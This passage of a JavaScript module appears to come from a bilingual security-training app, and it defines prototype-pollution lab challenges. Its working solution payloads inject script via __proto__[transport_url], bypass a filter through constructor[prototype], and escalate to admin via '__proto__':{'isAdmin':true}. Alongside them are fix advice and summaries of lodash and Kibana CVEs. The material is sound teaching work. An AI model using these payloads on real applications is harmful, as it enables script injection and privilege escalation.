          return { request: values.b, log: [], response: r.response, ...(r.polluted['json spaces'] ? verdict(true, 'The indentation changed: the prototype is polluted.', '缩进变了：原型被污染了。') : neutral('Compact JSON, as usual.', '和往常一样的紧凑 JSON。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Find the gadget', '找到利用点'),
      goal: L('The site parses location.search into an object with a vulnerable deparam(), and later runs: if (config.transport_url) { s = document.createElement("script"); s.src = config.transport_url; document.body.append(s) }. Make alert() run.', '网站用有漏洞的 deparam() 把 location.search 解析成对象，之后执行：if (config.transport_url) { s = document.createElement("script"); s.src = config.transport_url; document.body.append(s) }。让 alert() 运行。'),
      fields: [{ id: 'q', label: L('Query string', '查询字符串'), default: '?search=jacket' }],
      run({ q }) {
        const r = clientPP(q);
        return { log: r.log, response: r.html || '(no script added)', runs: r.runs };
      },
      check: (v, o) => o.runs,
      hint: L('Pollute transport_url through __proto__, with a data: URL whose content is JavaScript.', '通过 __proto__ 污染 transport_url，值是一个内容为 JavaScript 的 data: URL。'),
      solution: '?__proto__[transport_url]=data:,alert(1);',
      explain: L('Two ingredients: a source that writes to the prototype, and a gadget that reads an undefined property. Fixing either breaks the chain; fixing the source is better.', '两个要素：一个能写入原型的源，以及一个读取未定义属性的利用点。修复其中任意一个都能打断链条；修复源头更好。'),
    },
    {
      title: L('Around the filter', '绕过过滤器'),
      goal: L('The parser now removes the text “__proto__” from keys (once). Same gadget. Make alert() run.', '解析器现在会从键中删除一次“__proto__”文本。利用点不变。让 alert() 运行。'),
      fields: [{ id: 'q', label: L('Query string', '查询字符串'), default: '?__proto__[transport_url]=data:,alert(1);' }],
      run({ q }) {
        const r = clientPP(q, { strip: true });
        return { log: r.log, response: r.html || '(no script added)', runs: r.runs };
      },
      check: (v, o) => o.runs,
      hint: L('There are two routes: a key that becomes __proto__ after one removal, or a path that reaches the prototype without that word.', '有两条路：一个删除一次后变成 __proto__ 的键，或者一条不用这个词也能到达原型的路径。'),
      solution: '?constructor[prototype][transport_url]=data:,alert(1);',
      explain: L('String sanitising misses equivalent paths. Reject dangerous keys structurally, or build objects with Object.create(null) / Map.', '字符串净化会漏掉等价路径。在结构上拒绝危险的键，或者用 Object.create(null) / Map 构造对象。'),
    },
    {
      title: L('Become admin on the server', '在服务端成为管理员'),
      goal: L('The change-address endpoint merges your JSON into your user object; the admin check is if (user.isAdmin). Become an admin.', '修改地址接口会把你的 JSON 合并进你的用户对象；管理员检查是 if (user.isAdmin)。成为管理员。'),
      fields: [{ id: 'b', label: L('JSON body', 'JSON 请求体'), rows: 2, default: '{"address_line_1":"Wiener HQ","isAdmin":true}' }],
      run({ b }) {
        let direct = false;
        try {
          direct = JSON.parse(b).isAdmin === true;
        } catch {
          direct = false;
        }
        const r = serverPP(b);
        if (r.err) return { log: [], response: 'HTTP/1.1 400', admin: false };
        return { log: [direct ? L('🛡 own property isAdmin is filtered out by the allowlist', '🛡 自有属性 isAdmin 被白名单过滤掉') : '', ...Object.keys(r.polluted).map((k) => `Object.prototype.${k} = ${JSON.stringify(r.polluted[k])}`)].filter(Boolean), response: r.response, admin: r.isAdmin };
      },
      check: (v, o) => o.admin,
      hint: L('Setting isAdmin directly is filtered. Set it on something every object inherits from.', '直接设置 isAdmin 会被过滤。把它设在每个对象都会继承的东西上。'),
      solution: '{"address_line_1":"Wiener HQ","__proto__":{"isAdmin":true}}',
      explain: L('The allowlist checked own properties, but the admin check also looked up the prototype chain. Use Object.hasOwn() for security checks and block __proto__ in merges.', '白名单检查的是自有属性，而管理员检查还会沿原型链查找。安全检查要用 Object.hasOwn()，并在合并时屏蔽 __proto__。'),
    },
  ],
  cases: [
    { year: '2019', ref: 'CVE-2019-10744', title: L('lodash defaultsDeep', 'lodash defaultsDeep'), what: L('lodash, one of the most depended-on npm packages, had a prototype pollution flaw in defaultsDeep: a payload with a constructor/prototype path could add or modify properties of Object.prototype. It was fixed in 4.17.12.', 'lodash 是依赖最广的 npm 包之一，其 defaultsDeep 存在原型污染漏洞：带有 constructor/prototype 路径的 payload 可以添加或修改 Object.prototype 的属性。该问题在 4.17.12 中修复。'), lesson: L('Deep-merge utilities are prime pollution sources; keep them patched.', '深度合并工具是主要的污染源；及时打补丁。') },
    { year: '2019', ref: 'CVE-2019-7609', title: L('Kibana Timelion to RCE', 'Kibana Timelion 到 RCE'), what: L('A prototype pollution flaw in Kibana’s Timelion visualiser let an attacker set properties on Object.prototype, which then influenced how Kibana spawned a Node.js child process, leading to remote code execution. Michał Bentkowski described the exploit chain.', 'Kibana 的 Timelion 可视化组件中存在原型污染漏洞，攻击者可以在 Object.prototype 上设置属性，进而影响 Kibana 启动 Node.js 子进程的方式，导致远程代码执行。Michał Bentkowski 描述了这条利用链。'), lesson: L('Server-side pollution can reach process spawning options: think RCE, not just logic bugs.', '服务端原型污染可以影响进程启动选项：要想到 RCE，而不只是逻辑漏洞。') },
  ],
};

export const ADV4B = { 'host-header': hostHeader, smuggling, oauth, jwt, 'prototype-pollution': prototypePollution };
